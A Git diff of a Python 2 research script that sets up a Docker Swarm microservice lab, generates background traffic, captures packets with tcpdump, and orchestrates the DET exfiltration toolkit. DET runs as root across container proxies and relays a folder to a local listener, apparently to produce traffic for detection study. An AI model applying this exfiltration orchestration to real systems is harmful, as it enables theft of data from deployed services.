@@ -7,12 +7,16 @@ this stage (though it makes more sense later, when I'm actually analyzing the pc
 '''
 
 # okay, so the plan for saturday is:
-#   TODO: monday: I'm up to about line 155 in making this work. So keep going from there.
+#   TODO: monday: I'm up to about line 155 in making this work. So keep going from there. (note: actually
+#                   it seems that whatever retrieves the IP for the containers is broken too)
 #                 I think I can get those whole thing working on Monday (I'd say maybe like 4-5 hours)
 #                 Then I can get working on those graph below.
 #                 Plus, need to get the configs (below) + write instructions for recovering the pcaps
 #                       from the cloudlab machine (should be fairly easy but is still important)
 #                 todo: automate getting the relevant docker configs (for the pcap processing function)
+#                 also want to update those blogs posts / README / architectural diagram / my_working_paper
+#                 [but getting this working for sockshop + nice graphs would be sufficient, then on tuesday
+#                 I can work on getting it work for atsea store (plus get the rest of the graph-based analysis)
 #    also, I can't forget about making those graphs. i'm going to want to (1) fix/finish
 #       those aggregate boxplots that I wanted (2) implement those other metrics (3) try running
 #       on sockshop. This may seem like a lot, but (1) should only take like 1/2 an hour and (3) ideally
@@ -30,6 +34,7 @@ import json
 import docker
 import random
 import re
+import pexpect
 
 #Locust contemporary client count.  Calculated from the function f(x) = 1/25*(-1/2*sin(pi*x/12) + 1.1), 
 #   where x goes from 0 to 23 and x represents the hour of the day
@@ -49,7 +54,7 @@ CLIENT_RATIO_CYBER = [0.0328, 0.0255, 0.0178, 0.0142, 0.0119, 0.0112, 0.0144, 0.
 0.0574, 0.0571, 0.0568, 0.0543, 0.0532, 0.0514, 0.0514, 0.0518, 0.0522, 0.0571, 0.0609, 0.0589, 0.0564]
 
 
-def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip):
+def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, install_det_depen_p):
     # step (1) read in the config file
     with open(config_file + '.json') as f:
         config_params = json.load(f)
@@ -76,7 +81,7 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip):
     network_namespaces = network_ids_to_namespaces.values()
     print "full_network_ids", full_network_ids
     print "network_ids_to_namespaces", network_ids_to_namespaces
-    print "network_namespaces", network_ids_to_namespaces
+    print "network_namespaces", network_ids_to_namespaces.values()
 
     # step (3) prepare system for data exfiltration (i.g. get DET working on the relevant containers)
     # note: I may want to re-select the specific instances during each trial
@@ -97,6 +102,7 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip):
         print "new selected proxies", selected_proxies[proxy_class]
         index += 1
 
+    print "selected proxies", selected_proxies
     # get_class_instances cannot get the ingress network, so we must compensate manually
     if orchestrator == 'docker_swarm':
         print "let's handle the ingress network edgecase"
@@ -133,90 +139,105 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip):
     for container, network_to_ip in proxy_instance_to_networks_to_ip.iteritems():
         print container.name, [i.name for i in network_to_ip.keys()]
 
+    selected_containers = selected_proxies.copy()
+    selected_containers.update(selected_originators)
+
+
     print "#####"
 
     for name_of_class, network in class_to_networks.iteritems():
         print name_of_class, [i.name for i in network]
 
+    exfil_protocol = config_params["exfiltration_info"]["exfil_protocol"]
+    #'''
     # need to install the pre-reqs for each of the containers (proxies + orgiinator)
     # note: assuming endpoint (i.e. local) pre-reqs are already installed
-    for class_name, container_instances in possible_proxies.iteritems():
-        for container in container_instances:
-            install_det_dependencies(orchestrator, container, class_to_installer[class_name])
+    if install_det_depen_p:
+        for class_name, container_instances in possible_proxies.iteritems():
+            for container in container_instances:
+                install_det_dependencies(orchestrator, container, class_to_installer[class_name])
 
-    print "possible_originators", possible_originators
-    for class_name, container_instances in possible_originators.iteritems():
-        for container in container_instances:
-            install_det_dependencies(orchestrator, container, class_to_installer[class_name])
+        print "possible_originators", possible_originators
+        for class_name, container_instances in possible_originators.iteritems():
+            for container in container_instances:
+                install_det_dependencies(orchestrator, container, class_to_installer[class_name])
 
     # start thes proxy DET instances (note: will need to dynamically configure some
     # of the configuration file)
     # note: this is only going to work for a single src and a single dst ip, ATM
-    # TODO:  I should probably make a function to that takes which pair of containers you
-    # want an ip connection between and it returns the ip, since I have pretty much the same
-    # code three times below...
-    exfil_protocol = config_params["exfiltration_info"]["exfil_protocol"]
     for class_name, container_instances in selected_proxies.iteritems():
         # okay, gotta determine srcs and dst
         # okay, so fine location in exfil_path
         # look backward to find src class, then index into selected_proxies, and then index into
         # instances_to_network_to_ips (will need to match up networks)
-        loc_in_exfil_path = exfil_path.index(class_name)
-        prev_class_in_path = exfil_path[loc_in_exfil_path + 1]
-        prev_instance = selected_proxies[prev_class_in_path]
-        current_class_networks = proxy_instance_to_networks_to_ip[class_name].keys()
-        prev_class_networks = proxy_instance_to_networks_to_ip[prev_instance].keys()
-        prev_and_current_class_network = list(set(current_class_networks + prev_class_networks))[0] # should be precisly one
-        prev_instance_ip = [proxy_instance_to_networks_to_ip[prev_instance][prev_and_current_class_network]]
 
-        # look forward to find dst class, do the same indexing thing; but if it is at the front, then it'd want to
-        # send the data to the local instance
-        if loc_in_exfil_path == 0:
-            # then gotta pass it to the endpoint (i.e. the local instance running it)
-            next_class_in_path = 'local'
-            # todo check if this works for k8s also (so far only checked for swarm)
-            next_instance_ip = localhostip
-
-        else:
-            # then can just pass to another proxy in the exfiltration path
-            next_class_in_path = exfil_path[loc_in_exfil_path - 1]
-            next_instance = selected_proxies[next_class_in_path]
-            next_class_networks = proxy_instance_to_networks_to_ip[next_instance].keys()
-            next_and_current_class_network = list(set(current_class_networks + next_class_networks))[
-                0]  # should be precisly one
-            next_instance_ip = proxy_instance_to_networks_to_ip[next_class_networks][next_and_current_class_network]
+        dst,srcs=find_dst_and_srcs_ips_for_det(exfil_path, class_name, selected_containers, localhostip,
+                                                proxy_instance_to_networks_to_ip, class_to_networks)
 
         for container in container_instances:
-            start_det_proxy_mode(orchestrator, container, prev_instance_ip, next_instance_ip, exfil_protocol)
+            start_det_proxy_mode(orchestrator, container, srcs, dst, exfil_protocol)
 
     # start the endpoint (assuming the pre-reqs are installed prior to the running of this script)
-    srcs = [ proxy_instance_to_networks_to_ip[ selected_proxies[exfil_path[0]] ]['ingress'] ]
+    # todo: modify this for the k8s scaneario
+    print proxy_instance_to_networks_to_ip[ selected_proxies[exfil_path[0]][0] ]
+    srcs = None
+    for network, ip in proxy_instance_to_networks_to_ip[ selected_proxies[exfil_path[0]][0] ].iteritems():
+        if network.name == 'ingress':
+            srcs = [ip]
+            break
+    if not srcs:
+        print "cannot find the the hop-point immediately before the local DET instance"
+        exit(1)
+    #srcs = [ proxy_instance_to_networks_to_ip[ selected_proxies[exfil_path[0]][0] ]['ingress'] ]
     start_det_server_local(exfil_protocol, srcs)
 
+    #'''
     # now setup the originator (i.e. the client that originates the exfiltrated data)
-    next_class_in_path = exfil_path[-2]
-    next_instance = selected_proxies[next_class_in_path]
-    current_class_networks = proxy_instance_to_networks_to_ip[selected_originators[originator_class][0]].keys()
-    next_class_networks = proxy_instance_to_networks_to_ip[next_instance].keys()
-    next_and_current_class_network = list(set(current_class_networks + next_class_networks))[
-        0]  # should be precisly one
-    next_instance_ip = proxy_instance_to_networks_to_ip[next_instance][next_and_current_class_network]
-    for class_name, container_instances in selected_originators:
+    next_instance_ip, _ = find_dst_and_srcs_ips_for_det(exfil_path, originator_class,
+                                                                         selected_containers, localhostip,
+                                                                         proxy_instance_to_networks_to_ip,
+                                                                         class_to_networks)
+
+    print "next ip for the originator to send to", next_instance_ip
+    for class_name, container_instances in selected_originators.iteritems():
         for container in container_instances:
             setup_config_file_det_client(next_instance_ip, container)
 
     experiment_length = config_params["experiment"]["experiment_length_sec"]
     for i in range(0, int(config_params["experiment"]["number_of_trials"])):
-        # step (4) setup testing infrastructure (i.e. tcpdump)
-        for network_namespace in network_namespaces:
-            filename = config_params["experiment"]["experiment_name"] + '_' + network_namespace + '_' + str(i) + '.pcap'
-            thread.start_new_thread(start_tcpdump, (orchestrator, network_namespaces, experiment_length + 5, filename))
+        # step (3b) get docker configs for docker containers (assuming # is constant for the whole experiment)
+        container_id_file = experiment_name + '_docker' + '_' + str(i) + '_containers.txt'
+        container_config_file = experiment_name + '_docker' '_' + str(i) +  '_container_configs.txt'
+        try:
+            os.remove(container_id_file)
+        except:
+            print container_id_file, "   ", "does not exist"
+        try:
+            os.remove(container_config_file)
+        except:
+            print container_config_file, "   ", "does not exist"
+        out = subprocess.check_output(['pwd'])
+        print out
+
+        out = subprocess.check_output(['bash', './src/docker_container_configs.sh', container_id_file, container_config_file])
+        print out
 
         # step (5) start load generator (okay, this I can do!)
         start_time = time.time()
         max_client_count = int( config_params["experiment"]["number_background_locusts"])
-        thread.start_new_thread(generate_background_traffic, (experiment_length, max_client_count,
+        # todo: re-enable when ready...
+        thread.start_new_thread(generate_background_traffic, (str(int(experiment_length)+5), max_client_count,
                     config_params["experiment"]["traffic_type"], config_params["experiment"]["background_locust_spawn_rate"]))
+
+        # step (4) setup testing infrastructure (i.e. tcpdump)
+        for network_id, network_namespace in network_ids_to_namespaces.iteritems():
+            current_network =  client.networks.get(network_id)
+            print "about to tcpdump on:", current_network.name
+            filename = config_params["experiment_name"] + '_' + current_network.name + '_' + str(i) + '.pcap'
+            #thread.start_new_thread(start_tcpdump, (orchestrator, network_namespace, str(int(experiment_length) + 5), filename))
+            # okay, for now, let's just check w/o using a seperate thread (for easier debugging...)
+            thread.start_new_thread(start_tcpdump, (orchestrator, network_namespace, str(int(experiment_length)), filename))
+
 
         # step (6) start data exfiltration at the relevant time
         ## this will probably be a fairly simple modification of part of step 3
@@ -224,19 +245,30 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip):
         exfil_start_time = int(config_params["exfiltration_info"]["exfil_start_time"])
         exfil_end_time = int(config_params["exfiltration_info"]["exfil_end_time"])
 
+        print "need to wait this long before starting the det client...", start_time + exfil_start_time - time.time()
+        print "current time", time.time(), "start time", start_time, "exfil_start_time", exfil_start_time, "exfil_end_time", exfil_end_time
         time.sleep(start_time + exfil_start_time - time.time())
-        file_to_exfil = config_params["exfiltration_info"]["file_to_exfil"]
-        for class_name, container_instances in selected_originators:
+        file_to_exfil = config_params["exfiltration_info"]["folder_to_exfil"]
+        for class_name, container_instances in selected_originators.iteritems():
             for container in container_instances:
-                start_det_client(file_to_exfil, exfil_protocol, container)
+                thread.start_new_thread(start_det_client, (file_to_exfil, exfil_protocol, container))
 
+        print "need to wait this long before stopping the det client...", start_time + exfil_end_time - time.time()
         time.sleep(start_time + exfil_end_time - time.time())
-        for class_name, container_instances in selected_originators:
+        for class_name, container_instances in selected_originators.iteritems():
             for container in container_instances:
                 stop_det_client(container)
 
         # step (7) wait, all the tasks are being taken care of elsewhere
-        time.sleep(start_time + experiment_length + 5 - time.time())
+        time.sleep(start_time + int(experiment_length) + 7 - time.time())
+        # I don't wanna return while the other threads are still doing stuff b/c I'll get confused
+
+
+    # stopping the proxies can be done the same way (useful if e.g., switching
+    # protocols between experiments, etc.)
+    for class_name, container_instances in selected_proxies.iteritems():
+        for container in container_instances:
+            stop_det_client(container)
 
 
 def prepare_app(app_name, config_params, ip, port):
@@ -335,15 +367,54 @@ def start_tcpdump(orchestrator, network_namespace, tcpdump_time, filename):
         pass
     elif orchestrator == "docker_swarm":
         # ssh root@MachineB 'bash -s' < local_script.sh
-        args = ["docker-machine", "ssh -s", "<", "./src/start_tcpdump.sh", network_namespace, tcpdump_time,
-                orchestrator, filename]
-        subprocess.Popen(args)
+        #args = ["docker-machine", "ssh", "default",  "-s", "./src/start_tcpdump.sh"]
+        #, network_namespace, tcpdump_time,
+                #orchestrator, filename
+        #out = subprocess.check_output(args)
+        #print out
+        #args = ['docker-machine', 'ssh', 'default', '-t', "sudo ls /var/run/docker/netns"]
 
-        time.sleep(tcpdump_time)
+        start_netshoot = "docker run -it --rm -v /var/run/docker/netns:/var/run/docker/netns -v /home/docker:/outside --privileged=true nicolaka/netshoot"
+        print network_namespace, tcpdump_time
+        switch_namespace =  'nsenter --net=/var/run/docker/netns/' + network_namespace + ' ' 'sh'
+        start_tcpdum = "tcpdump -G " + tcpdump_time + ' -W 1 -i ' + "br0" + ' -w /outside/' + filename
+        cmd_to_send = start_netshoot + ';' + switch_namespace + ';' + start_tcpdum
+        print "cmd_to_send", cmd_to_send
+        print "start_netshoot", start_netshoot
+        print "switch_namespace", switch_namespace
+        print "start_tcpdum", start_tcpdum
+
+        args = ['docker-machine', 'ssh', 'default', '-t', cmd_to_send]
+
+        child = pexpect.spawn('docker-machine ssh default')
+        child.expect('##')
+        print child.before, child.after
+        print "###################"
+        child.sendline(start_netshoot)
+        child.expect('Netshoot')
+        print child.before, child.after
+        child.sendline(switch_namespace)
+        child.expect('#')
+        print child.before, child.after
+        child.sendline(start_tcpdum)
+        child.expect('bytes')
+        print child.before, child.after
+        print "okay, all commands sent!"
+        #print "args", args
+        #out = subprocess.Popen(args)
+        #print out
+
+        time.sleep(int(tcpdump_time) + 2)
+
+        # don't want to leave too many docker containers running
+        child.sendline('exit')
+        child.sendline('exit')
+
         # tcpdump file is safely on minikube but we might wanna move it all the way to localhost
-        args2 = ["docker-machine", "scp", "-o", "StrictHostKeyChecking=no",
-                 "/home/docker/" + filename, filename]
-        subprocess.Popen(args2)
+        args2 = ["docker-machine", "scp",
+                 "docker@default:/home/docker/" + filename, filename]
+        out = subprocess.check_output(args2)
+        print out
 
 
 # returns a list of container names that correspond to the
@@ -401,7 +472,7 @@ def map_container_instances_to_ips(orchestrator, class_to_instances, class_to_ne
             for connected_network in class_to_networks[class_name]:
                 instance_to_networks_to_ip[container][connected_network] = []
                 try:
-                    ip_on_this_network = container_atrribs["NetworkSettings"]["Networks"][connected_network]["IPAMConfig"][
+                    ip_on_this_network = container_atrribs["NetworkSettings"]["Networks"][connected_network.name]["IPAMConfig"][
                         "IPv4Address"]
                     instance_to_networks_to_ip[container][connected_network] = ip_on_this_network
                 except:
@@ -463,7 +534,6 @@ def map_network_ids_to_namespaces(orchestrator, full_network_ids):
         # (1)
         #
         args = ['docker-machine', 'ssh', 'default', '-t', "sudo ls /var/run/docker/netns"]
-        #args = ["docker-machine", "ssh", "<", "./src/get_network_namespaces.sh"]
         print "let's get some network namespaces...", args
         out = subprocess.check_output(args)
         print "single string network namespaces", out
@@ -503,76 +573,144 @@ def start_det_proxy_mode(orchestrator, container, srcs, dst, protocol):
             # use 'docker cp' shell command
         # (2) send a command to start DET
             # just use container.exec_run, it's a one liner, so no big deal
+        # going to do a bit of a workaround below, since using pipes with the subprocesses
+        # module is tricky, so let's make a copy of the file we want to modify and then we
+        # can just modify it in place
+        cp_command = ['cp', './src/det_config_template.json', './current_det_config.json']
+        out = subprocess.check_output(cp_command)
+        print "cp command result", out
 
-        sed_command = ["sed", "-e",  "\'s/TARGETIP/" + dst + "/\'", "-e", "\'s/PROXIESIP/" + srcs +"/\'",
-                       "./src/det_config_template.json", ">", "./current_det_config.json"]
-        subprocess.Popen(sed_command)
+        targetip_switch = "s/TARGETIP/\"" + dst + "\"/"
+        print srcs[0], srcs
+        proxiesip_switch = "s/PROXIESIP/" + "[\\\"" + srcs[0] + "\\\"]" + "/"
+        print "targetip_switch", targetip_switch
+        print "proxiesip_switch", proxiesip_switch
+        sed_command = ["sed", "-i", "-e",  targetip_switch, "-e", proxiesip_switch,
+                       "./current_det_config.json"]
+        print "sed_command", sed_command
+        out = subprocess.check_output(sed_command)
+        print "sed command result", out
 
-        upload_config_command = ["docker", "cp", container.id+ ":/config.json", "./current_det_config.json"]
-        subprocess.Popen(upload_config_command)
+        upload_config_command = ["docker", "cp", "./current_det_config.json", container.id+ ":/config.json"]
+        out = subprocess.check_output(upload_config_command)
+        print "upload_config_command", upload_config_command
+        print "upload_config_command result", out
 
-        start_det_command = ["python", "/det.py", "-c", "./config.json", "-p", protocol, "-Z"]
+        start_det_command = ["python", "/DET/det.py", "-c", "/config.json", "-p", protocol, "-Z"]
+        print "start_det_command", start_det_command
 
-        container.exec_run(start_det_command)
+        # stdout=False b/c hangs otherwise
+        try:
+            out = container.exec_run(start_det_command, user="root", workdir='/DET',stdout=False)
+            print "response from DET proxy start command:"
+            print out
+        except:
+            print "start det proxy command is hanging, going to hope it is okay and just keep going"
+        #for output in out.output:
+        #    print output
+        #print "\n"
 
     else:
         pass
 
 
 def start_det_server_local(protocol, srcs):
-    sed_command = ["sed", "\'s/PROXIESIP/" + srcs + "/\'",
-                   "./src/det_config_local_template.json", ">", "./src/det_config_local_configured.json"]
-    subprocess.Popen(sed_command)
+    # okay, need to modify this so that it can work (can use the working version above as a template)
+
+    cp_command = ['sudo', 'cp', "./src/det_config_local_template.json", "/DET/det_config_local_configured.json"]
+    out = subprocess.check_output(cp_command)
+    print "cp command result", out
+
+    proxiesip_switch = "s/PROXIESIP/" + "[\\\"" + srcs[0] + "\\\"]" + "/"
+    sed_command = ["sudo", "sed", "-i", proxiesip_switch, "/DET/det_config_local_configured.json"]
+    print "proxiesip_switch", proxiesip_switch
+    print "sed_command", sed_command
+    out = subprocess.check_output(sed_command)
+    print out
 
     # note: don't have to move anything b/c the file is already local
+    #out = subprocess.check_output(['pwd'])
+    #print out
 
-    cmds = ["python", "det.py", "-L" ,"-c", "./src/det_config_local_configured.json", "-p", protocol]
-    subprocess.Popen(cmds)
-
+    cmds = ["sudo", "python", "/DET/det.py", "-L" ,"-c", "/DET/det_config_local_configured.json", "-p", protocol]
+    out = subprocess.Popen(cmds, cwd='/DET/')
+    print out
 
 def setup_config_file_det_client(dst, container):
-    sed_command = ["sed", "\'s/TARGETIP/" + dst + "/\'",
-                   "./src/det_config_client_template.sh", ">", "./src/det_config_client.sh.json"]
-    subprocess.Popen(sed_command)
+    # note: don't want to actually start the client yet, however
+    out = subprocess.check_output(['pwd'])
+    print out
 
-    upload_config_command = ["docker", "cp", container.id + ":/config.json", "./src/det_config_client.sh.json"]
-    subprocess.Popen(upload_config_command)
+    cp_command = ['cp', './src/det_config_client_template.json', './det_config_client.json']
+    out = subprocess.check_output(cp_command)
+    print "cp command result", out
+
+    print 'dst', dst
+    targetip_switch = "s/TARGETIP/\"" + dst + "\"/"
+    print "targetip_switch", targetip_switch
+    sed_command = ["sed", "-i", targetip_switch, "./det_config_client.json"]
+    print "sed_command", sed_command
+    out = subprocess.check_output(sed_command)
+    print "sed command result", out
+
+    upload_config_command = ["docker", "cp", "./det_config_client.json", container.id + ":/config.json"]
+    out = subprocess.check_output(upload_config_command)
+    print "upload_config_command", upload_config_command
+    print "upload_config_command result", out
 
 
-def start_det_client(file, protocol, container):
-    cmds = ["python", "/det.py", "-c", "./config.json", "-p", protocol, "-f", file]
-    container.exec_run(cmds)
-
+def start_det_client(folder, protocol, container):
+    cmds = ["python", "/DET/det.py", "-c", "/config.json", "-p", protocol, "-d", folder]
+    out = container.exec_run(cmds, user="root", workdir='/DET', stdout=False)
+    print "start det client output", out
 
 def stop_det_client(container):
     ## let's just kill all python processes, that'll be easier than trying to record PIDs, or anything else
     cmds = ["pkill", "-9", "python"]
-    container.exec_run(cmds)
+    out =container.exec_run(cmds, user="root", stream=True)
+    print "stop det client output: "#, out
+    #print "response from command string:"
+    for output in out.output:
+        print output
 
-def find_dst_and_srcs_ips_for_det(exfil_path, current_class_name):
+def find_dst_and_srcs_ips_for_det(exfil_path, current_class_name, selected_containers, localhostip,
+                                  proxy_instance_to_networks_to_ip, class_to_networks):
     current_loc_in_exfil_path = exfil_path.index(current_class_name)
+    current_class_networks = class_to_networks[current_class_name] #proxy_instance_to_networks_to_ip[current_class_name].keys()
 
     # at originator -> no srcs (or rather, it is the src for itself):
-    if current_loc_in_exfil_path == len(exfil_path):
+    if current_loc_in_exfil_path+1 == len(exfil_path):
         srcs = None
         pass
     else: # then it has srcs other than itself
-        prev_class_in_path = exfil_path[loc_in_exfil_path + 1]
-        pass
+        prev_class_in_path = exfil_path[current_loc_in_exfil_path + 1]
+        print selected_containers
+        prev_instance = selected_containers[prev_class_in_path][0] # note: assuming that there will be only one
+        prev_class_networks = proxy_instance_to_networks_to_ip[prev_instance].keys()
+
+        # containers must be on same network to communicate...
+        prev_and_current_class_network = list( set(current_class_networks) & set(prev_class_networks))[0] # should be precisely one
+
+        # now retrieve the previous container's IP for the correct network
+        print "finding previous ip in exfiltration path...", proxy_instance_to_networks_to_ip[prev_instance], prev_instance.name
+        print prev_and_current_class_network.name, [i.name for i in proxy_instance_to_networks_to_ip[prev_instance]]
+        prev_instance_ip = [proxy_instance_to_networks_to_ip[prev_instance][prev_and_current_class_network]]
+        srcs = prev_instance_ip
 
     # at last microservice hop -> next dest is local host
     if current_loc_in_exfil_path == 0:
-        pass
+        next_instance_ip = localhostip
     else: # then it'll hop through another microservice
-        pass
+        # then can just pass to another proxy in the exfiltration path
+        next_class_in_path = exfil_path[current_loc_in_exfil_path - 1]
+        next_instance = selected_containers[next_class_in_path][0] # note: assuming that there will be only one
+        next_class_networks = proxy_instance_to_networks_to_ip[next_instance].keys()
+        next_and_current_class_network = list(set(current_class_networks) & set(next_class_networks))[
+            0]  # should be precisly one
+        print "next_and_current_class_network", next_and_current_class_network
+        next_instance_ip = proxy_instance_to_networks_to_ip[next_instance][next_and_current_class_network]
 
-    prev_instance = selected_proxies[prev_class_in_path]
-    current_class_networks = proxy_instance_to_networks_to_ip[class_name].keys()
-    prev_class_networks = proxy_instance_to_networks_to_ip[prev_instance].keys()
-    prev_and_current_class_network = list(set(current_class_networks + prev_class_networks))[
-        0]  # should be precisly one
-    prev_instance_ip = [proxy_instance_to_networks_to_ip[prev_instance][prev_and_current_class_network]]
-
+    return next_instance_ip, srcs
 
 if __name__=="__main__":
     print "RUNNING"
@@ -588,6 +726,9 @@ if __name__=="__main__":
     parser.add_argument('--prepare_app_p', dest='prepare_app_p', action='store_true',
                         default=False,
                         help='sets up the application (i.e. loads db, etc.)')
+    parser.add_argument('--install_det_depen', dest='install_det_depen_p', action='store_true',
+                        default=False,
+                        help='install DET dependencies on the relevant containers?')
     parser.add_argument('--port',dest="port_number", default='80')
     parser.add_argument('--ip',dest="vm_ip", default='None')
     parser.add_argument('--docker_daemon_port',dest="docker_daemon_port", default='2376')
@@ -600,7 +741,7 @@ if __name__=="__main__":
 
     args = parser.parse_args()
     #print args.restart_minikube, args.setup_sockshop, args.run_experiment, args.analyze, args.output_dict, args.tcpdump, args.on_cloudlab, args.app, args.istio_p, args.hpa
-    print args.exp_name, args.config_file, args.prepare_app_p, args.port_number, args.vm_ip, args.localhostip
+    print args.exp_name, args.config_file, args.prepare_app_p, args.port_number, args.vm_ip, args.localhostip, args.install_det_depen_p
 
     with open(args.config_file + '.json') as f:
         config_params = json.load(f)
@@ -621,4 +762,4 @@ if __name__=="__main__":
     os.environ['DOCKER_TLS_VERIFY'] = "1"
     os.environ['DOCKER_CERT_PATH'] = path_to_docker_machine_tls_certs
 
-    main(args.exp_name, args.config_file, args.prepare_app_p, int(args.port_number), ip, args.localhostip)
+    main(args.exp_name, args.config_file, args.prepare_app_p, int(args.port_number), ip, args.localhostip, args.install_det_depen_p)
